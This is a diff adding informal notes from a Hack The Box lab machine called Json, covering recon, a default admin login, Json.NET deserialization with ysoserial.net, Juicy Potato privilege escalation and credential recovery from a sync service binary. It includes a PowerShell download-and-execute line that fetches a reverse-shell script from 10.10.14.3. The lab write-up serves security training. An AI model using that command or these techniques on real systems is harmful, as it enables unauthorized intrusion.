@@ -1,0 +1,136 @@
+# Recon
+## comm tcp
+21/tcp    open  ftp          FileZilla ftpd
+| ftp-syst:
+|_  SYST: UNIX emulated by FileZilla
+80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Json HTB
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 4h02m03s, deviation: 0s, median: 4h02m02s
+|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:0b:1b (VMware)
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-06-17T19:19:24
+|_  start_date: 2020-06-17T19:07:13
+
+## vuln scripts
+| http-enum:
+|_  /login.html: Possible admin folder
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-vuln-cve2015-1635:
+|   VULNERABLE:
+|   Remote Code Execution in HTTP.sys (MS15-034)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2015-1635
+|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
+|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
+|       successfully exploited this vulnerability could execute arbitrary code in the context of the System account.
+|
+|     Disclosure date: 2015-04-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
+
+
+# Enum
+## 21 ftp
+ftp => FileZilla Server 0.9.60 beta => no exploit found
+anonymous => none
+
+## 135,139,445 smb/nbt
+nbtscan gives me:
+IP address       NetBIOS Name     Server    User             MAC address
+------------------------------------------------------------------------------
+10.10.10.158     JSON             <server>  <unknown>        00:50:56:b9:0b:1b
+
+not sure how to proceed.
+
+smbclient, smbmap, nothing
+
+## 80 http
+the HTTP.sys thing is ok but leaked memory gives me nothing (via msf)
+
+RTFSC =>
+* <!--<script src="js/sb-admin-2.min.js"></script> => didn't find
+* <script src="/js/app.min.js"></script> looks suspicious.
+
+
+RTFSC of js => found two functions and their code.
+Read the source code, found http://json.htb/api/Account => auth denied.
+in the app.min.js, found http://json.htb/api/token => also found this from burp when login.
+set cookies with "OAuth2" to true.
+
+found index.html, like a dashboard, but jumps to login page quickly.
+curl => found nothing.
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHH, admin:admin, always try the basic thing!!!
+read the cookies, the OAuth2 is: 
+eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
+use base64 -d => {"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
+the password is just md5 of admin.
+
+(Get hint)
+google asp.net 4.0 json exploit => not exact match but I guess it is the only possible attach vector
+https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html
+https://github.com/pwntester/ysoserial.net
+
+Ok, the biggest problem is the powershell command has double quotes but they are removed in the payload.
+Google powershell how to execute base64 => Use the same powershell command to do the conversion!! Their encoding are different in linux and windows.
+
+$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('powershell IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.14.3/rev_443.ps1")'))
+=> cABvAHcAZQByAHMAaABlAGwAbAAgAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwByAGUAdgBfADQANAAzAC4AcABzADEAIgApAA==
+
+# Priv Esc
+netstat found there is port 5985 => winrm, also nmap found it.
+also found 14147, not sure what is it.
+
+whoami /all => impersonate => juicy potato => root
+
+# Priv Esc2 (no shell)
+winpeas => 
+[+] Looking AppCmd.exe()
+[?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
+    AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe You should try to search for credential
+=> dead end
+
+listed Services =>  FIlesToSync(FIlesToSync)["C:\Program Files\Sync2Ftp\SyncLocation.exe"] - Autoload - isDotNet
+find this service's config and exe, config has password but maybe encrypted.
+=> ghidra reverse engineering => Hmmm, the decompiled C is aweful.
+=> (get hint) dnspy. I should have use `file` to see it is net exe.
+=> modify the binary and show the user:pass => superadmin:funnyhtb
+sadly psexec and smbclient and evil-winrm failed. Seems not the superadmin's password.
+
+Hmm, find the /tmp and log.txt, it seems it is uploading password.txt
+
+use chisel to forward the misterious 14147 port. ftp connect => failed
+nc connecd => pop out some messages itself.
+
+use the cred to login ftp without port forwarding => ok
+it pops out messages periodically, it seems it keeps trying "superadmin (::1)> STOR password.txt"
+find password.txt by reading the synclocation.exe.config => under C:\inetpub\wwwroot\jsonapp\Files
+=> ok... it seems we ca only use ftp to read root.txt but not shell.
+
+(we can have full disk read/write access but I need a windows pentest box like commando which I don't have now)
